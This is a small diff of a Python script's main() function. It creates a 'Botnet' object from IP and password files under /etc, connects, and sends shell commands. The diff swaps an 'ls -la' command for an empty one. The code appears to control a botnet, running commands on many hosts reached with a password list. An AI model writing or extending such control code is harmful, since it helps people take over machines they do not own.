@@ -144,9 +144,8 @@ def main():
 
     botnet = Botnet("/etc/ips", "/etc/pass")
     botnet.connect()
-
-    botnet.send_command("ls -la")
     botnet.send_command("")
+
     botnet.print_output()
     botnet.disconnect()
 
